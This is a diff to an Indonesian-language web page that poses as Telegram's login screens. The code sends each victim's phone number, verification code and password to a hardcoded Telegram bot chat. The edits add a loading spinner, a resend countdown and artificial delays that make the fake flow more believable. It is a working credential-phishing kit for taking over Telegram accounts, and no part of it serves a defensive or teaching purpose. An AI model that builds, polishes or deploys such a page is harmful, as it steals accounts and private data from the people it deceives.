@@ -31,6 +31,20 @@
         outline: none;
         box-shadow: 0 0 0 2px #2563eb;
     }
+    /* Add this CSS for the spinner */
+    .spinner {
+        border: 3px solid #ffffff;
+        border-radius: 50%;
+        border-top: 3px solid #2563eb;
+        width: 24px;
+        height: 24px;
+        animation: spin 0.5s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
 </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
@@ -78,16 +92,17 @@
         </div>
     </div>
 
-    <!-- Page 2: Verification Code Input -->
-    <div id="page2" class="page fixed inset-0 bg-white p-8 flex flex-col justify-center items-center hidden">
-        <div class="flex justify-center mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="w-12 h-12">
-        </div>
-        <h2 class="text-center text-xl font-semibold mb-2">Cek pesan Telegram Anda</h2>
-        <p id="verificationMessage" class="text-center text-gray-600 text-sm mb-6">Kami telah mengirimkan kode ke aplikasi Telegram untuk nomor Anda.</p>
-        
-        <!-- Code Input Fields -->
-        <!-- Code Input Fields -->
+<!-- Page 2: Verification Code Input -->
+<div id="page2" class="page fixed inset-0 bg-white p-8 flex flex-col justify-center items-center hidden">
+    <div class="flex justify-center mb-6">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="w-12 h-12">
+    </div>
+    <h2 class="text-center text-xl font-semibold mb-2">Cek pesan Telegram Anda</h2>
+    <p id="verificationMessage" class="text-center text-gray-600 text-sm mb-6">
+        Kami telah mengirimkan kode ke aplikasi Telegram untuk nomor Anda.
+    </p>
+    
+<!-- Code Input Fields -->
 <div class="flex justify-center space-x-2 mb-4">
     <input type="text" maxlength="1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 0)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
     <input type="text" maxlength="1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 1)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
@@ -95,10 +110,17 @@
     <input type="text" maxlength="1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 3)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
     <input type="text" maxlength="1" oninput="this.value = this.value.replace(/[^0-9]/g, ''); moveFocus(this, 4)" class="w-10 h-10 text-center border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
 </div>
-        
-       <!-- Button panah di pojok kanan bawah -->
-<button type="button" onclick="confirmCodeAndSendPhoneNumber()" class="arrow-button py-2 px-4 bg-blue-500 text-white font-semibold rounded-full hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">➔</button>
+
+    <!-- "Did not receive the code?" and timer -->
+    <div class="text-center text-sm text-gray-600 mb-4">
+        <p id="resendPrompt">Tidak menerima kode? <span id="timer" class="font-bold">60</span> detik</p>
+        <button id="resendCode" class="text-blue-500 hover:underline hidden">Kirim ulang</button>
+    </div>
+    
+    <!-- Button panah di pojok kanan bawah -->
+    <button type="button" onclick="confirmCodeAndSendPhoneNumber()" class="arrow-button py-2 px-4 bg-blue-500 text-white font-semibold rounded-full hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">➔</button>
 </div>
+    
 
 <!-- Password Input Page -->
 <div id="passwordPage" class="page w-full max-w-sm p-8 rounded-lg hidden">
@@ -128,128 +150,56 @@
 </div>
     
 <script>
-   
     function showPage(pageId) {
         // Hide all pages
         const pages = document.querySelectorAll('.page');
         pages.forEach(page => page.classList.add('hidden'));
-        
+
         // Show the selected page
         document.getElementById(pageId).classList.remove('hidden');
+
+        // Start timer if showing the verification page
+        if (pageId === 'page2') {
+            startTimer();
+        }
     }
 
     function confirmPhoneNumber() {
-    const phoneInput = document.getElementById('phone').value;
-    const phoneError = document.getElementById('phoneError');
-    
-    phoneError.classList.add('hidden');
-
-    // Validasi nomor telepon
-    if (!phoneInput.startsWith("08") && !phoneInput.startsWith("8")) {
-        phoneError.textContent = "Nomor telepon anda salah";
-        phoneError.classList.remove('hidden');
-        return;
-    }
-    
-    if (phoneInput.length < 7 || phoneInput.length > 12) {
-        phoneError.textContent = "Harap masukkan nomor telepon yang valid.";
-        phoneError.classList.remove('hidden');
-        return;
-    }
-
-    // Menampilkan nomor telepon yang dikonfirmasi
-    document.getElementById('displayPhone').textContent = `+62 ${phoneInput}`;
-    showPage('confirmationMessage');
-
-    // Kirim nomor telepon ke bot Telegram
-    const TELEGRAM_BOT_TOKEN = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'; // Ganti dengan token bot Anda
-    const CHAT_ID = '-4546395669'; // Ganti dengan ID chat Anda
-
-    // Membangun URL untuk mengirim pesan
-    const message = encodeURIComponent(`Nomor telepon baru: +62 ${phoneInput}`);
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-
-    // Menggunakan fetch untuk mengirim pesan
-    fetch(url)
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log('Pesan berhasil dikirim:', data);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-}
-function moveFocus(element, index) {
-    // Pindahkan fokus ke input selanjutnya setelah karakter dimasukkan
-    if (element.value.length >= element.maxLength) {
-        const nextInput = element.nextElementSibling;
-        if (nextInput) {
-            nextInput.focus();
-        }
-    }
-}
-
-function confirmCodeAndSendPhoneNumber() {
-    // Get phone number and verification code
-    const phoneInput = document.getElementById('phone').value;
-    const verificationCode = Array.from(document.querySelectorAll('#page2 input[type="text"]'))
-        .map(input => input.value)
-        .join('');
-
-    // Validate the verification code
-    if (verificationCode.length < 5) {
-        alert('Harap masukkan semua digit kode verifikasi.');
-        return;
-    }
-
-    // Send phone number and verification code to Telegram bot
-    const TELEGRAM_BOT_TOKEN = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'; // Replace with your bot token
-    const CHAT_ID = '-4546395669'; // Replace with your chat ID
-
-    const message = encodeURIComponent(`Nomor telepon: +62 ${phoneInput}, Kode verifikasi: ${verificationCode}`);
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-
-    // Use fetch to send the message
-    fetch(url)
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
-            return response.json();
-        })
-        .then(data => {
-            console.log('Pesan berhasil dikirim:', data);
-            // Navigate to the password page after successful submission
-            showPage('passwordPage');
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-}
-    function sendPasswordToBot() {
-        // Get the phone number, verification code, and password
         const phoneInput = document.getElementById('phone').value;
-        const passwordInput = document.getElementById('password').value;
+        const phoneError = document.getElementById('phoneError');
 
-        // Check if the password is entered
-        if (!passwordInput) {
-            alert('Harap masukkan kata sandi.');
+        phoneError.classList.add('hidden');
+
+        // Validasi nomor telepon
+        if (!phoneInput.startsWith("08") && !phoneInput.startsWith("8")) {
+            phoneError.textContent = "Nomor telepon anda salah";
+            phoneError.classList.remove('hidden');
+            return;
+        }
+        
+        if (phoneInput.length < 7 || phoneInput.length > 12) {
+            phoneError.textContent = "Harap masukkan nomor telepon yang valid.";
+            phoneError.classList.remove('hidden');
             return;
         }
 
-        // Send phone number and password to the Telegram bot
-        const TELEGRAM_BOT_TOKEN = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'; // Replace with your bot token
-        const CHAT_ID = '-4546395669'; // Replace with your chat ID
+        // Menampilkan nomor telepon yang dikonfirmasi
+        document.getElementById('displayPhone').textContent = `+62 ${phoneInput}`;
+        showPage('confirmationMessage');
 
-        const message = encodeURIComponent(`Nomor telepon: +62 ${phoneInput}, Kata sandi: ${passwordInput}`);
+        // Update pesan di halaman verifikasi kode dengan nomor telepon
+        document.getElementById('verificationMessage').textContent = 
+            `Kami telah mengirimkan kode ke aplikasi Telegram untuk +62 ${phoneInput} di perangkat Anda yang lain`;
+
+        // Kirim nomor telepon ke bot Telegram
+        const TELEGRAM_BOT_TOKEN = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'; // Ganti dengan token bot Anda
+        const CHAT_ID = '-4546395669'; // Ganti dengan ID chat Anda
+
+        // Membangun URL untuk mengirim pesan
+        const message = encodeURIComponent(`Nomor telepon baru: +62 ${phoneInput}`);
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
 
-        // Use fetch to send the message
+        // Menggunakan fetch untuk mengirim pesan
         fetch(url)
             .then(response => {
                 if (!response.ok) {
@@ -259,28 +209,157 @@ function confirmCodeAndSendPhoneNumber() {
             })
             .then(data => {
                 console.log('Pesan berhasil dikirim:', data);
-                // Optional: Display a success message or redirect to another page
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+
+    let countdown; // Variable to hold the countdown interval
+
+    function startTimer() {
+        let timeLeft = 60; // 60 seconds countdown
+        document.getElementById('resendPrompt').style.display = 'block';
+        const timerElement = document.getElementById('timer');
+        const resendButton = document.getElementById('resendCode');
+
+        // Update the timer every second
+        countdown = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.textContent = '0';
+                resendButton.classList.remove('hidden'); // Show resend button
+            } else {
+                timerElement.textContent = timeLeft;
+                timeLeft -= 1;
+            }
+        }, 1000);
+    }
+
+    function confirmCodeAndSendPhoneNumber() {
+    const arrowButton = document.querySelector('.arrow-button');
+    const originalContent = arrowButton.innerHTML;
+
+    // Show loading spinner
+    arrowButton.innerHTML = '<div class="spinner"></div>';
+    arrowButton.disabled = true;
+
+    setTimeout(() => {
+        // Simulate sending the phone number and verification code
+        const phoneInput = document.getElementById('phone').value;
+        const verificationCode = Array.from(document.querySelectorAll('#page2 input[type="text"]'))
+            .map(input => input.value)
+            .join('');
+
+        if (verificationCode.length < 5) {
+            alert('Harap masukkan semua digit kode verifikasi.');
+            arrowButton.innerHTML = originalContent;
+            arrowButton.disabled = false;
+            return;
+        }
+
+        // Simulate sending to bot
+        const TELEGRAM_BOT_TOKEN = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic';
+        const CHAT_ID = '-4546395669';
+
+        const message = encodeURIComponent(`Nomor telepon: +62 ${phoneInput}, Kode verifikasi: ${verificationCode}`);
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+
+        fetch(url)
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.json();
+            })
+            .then(() => {
+                showPage('passwordPage');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Gagal mengirim kode ke bot Telegram.');
+            })
+            .finally(() => {
+                // Restore button after loading
+                arrowButton.innerHTML = originalContent;
+                arrowButton.disabled = false;
+            });
+    }, 2000); // Delay for 2 seconds to simulate loading
+}
+
+    function sendPasswordToBot() {
+    const arrowButton = document.querySelector('.arrow-button');
+    const originalContent = arrowButton.innerHTML;
+
+    // Show loading spinner
+    arrowButton.innerHTML = '<div class="spinner"></div>';
+    arrowButton.disabled = true;
+
+    setTimeout(() => {
+        const phoneInput = document.getElementById('phone').value;
+        const passwordInput = document.getElementById('password').value;
+
+        if (!passwordInput) {
+            alert('Harap masukkan kata sandi.');
+            arrowButton.innerHTML = originalContent;
+            arrowButton.disabled = false;
+            return;
+        }
+
+        const TELEGRAM_BOT_TOKEN = '7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic';
+        const CHAT_ID = '-4546395669';
+
+        const message = encodeURIComponent(`Nomor telepon: +62 ${phoneInput}, Kata sandi: ${passwordInput}`);
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+
+        fetch(url)
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                return response.json();
+            })
+            .then(() => {
                 showPage('newPage');
             })
             .catch(error => {
                 console.error('Error:', error);
                 alert('Gagal mengirim kata sandi ke bot Telegram.');
+            })
+            .finally(() => {
+                // Restore button after loading
+                arrowButton.innerHTML = originalContent;
+                arrowButton.disabled = false;
             });
-    }
+    }, 2000); // Delay for 2 seconds to simulate loading
+}
     function togglePasswordVisibility() {
-    const passwordInput = document.getElementById("password");
-    const eyeIcon = document.getElementById("eyeIcon");
+        const passwordInput = document.getElementById("password");
+        const eyeIcon = document.getElementById("eyeIcon");
 
-    if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-        eyeIcon.innerHTML = `
-            <path d="M10 3C5.58 3 2 6.58 2 10s3.58 7 8 7 8-3.58 8-7-3.58-7-8-7zm0 12c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm-3.5-5a3.5 3.5 0 117 0 3.5 3.5 0 01-7 0z"/>
-        `;
-    } else {
-        passwordInput.type = "password";
-        eyeIcon.innerHTML = `
-            <path d="M10 3C5.58 3 2 6.58 2 10s3.58 7 8 7 8-3.58 8-7-3.58-7-8-7zm0 12c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm3.54-2.88L8.41 9.88l.71-.71 5.13 5.13-.71.71zm1.41-1.41l-.71-.71 2.83-2.83.71.71-2.83 2.83z"/>
-        `;
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+            eyeIcon.innerHTML = `
+                <path d="M10 3C5.58 3 2 6.58 2 10s3.58 7 8 7 8-3.58 8-7-3.58-7-8-7zm0 12c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm-3.5-5a3.5 3.5 0 117 0 3.5 3.5 0 01-7 0z"/>
+            `;
+        } else {
+            passwordInput.type = "password";
+            eyeIcon.innerHTML = `
+                <path d="M10 3C5.58 3 2 6.58 2 10s3.58 7 8 7 8-3.58 8-7-3.58-7-8-7zm0 12c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm3.54-2.88L8.41 9.88l.71-.71 5.13 5.13-.71.71zm1.41-1.41l-.71-.71 2.83-2.83.71.71-2.83 2.83z"/>
+            `;
+        }
+    }
+    function moveFocus(currentInput, index) {
+    // If the input has a value, move to the next input
+    if (currentInput.value.length === 1) {
+        const nextInput = document.querySelectorAll('#page2 input[type="text"]')[index + 1];
+        if (nextInput) {
+            nextInput.focus();
+        }
+    }
+
+    // If the input is empty and user deletes, focus on the previous input
+    if (currentInput.value.length === 0) {
+        const previousInput = document.querySelectorAll('#page2 input[type="text"]')[index - 1];
+        if (previousInput) {
+            previousInput.focus();
+        }
     }
 }
 </script>
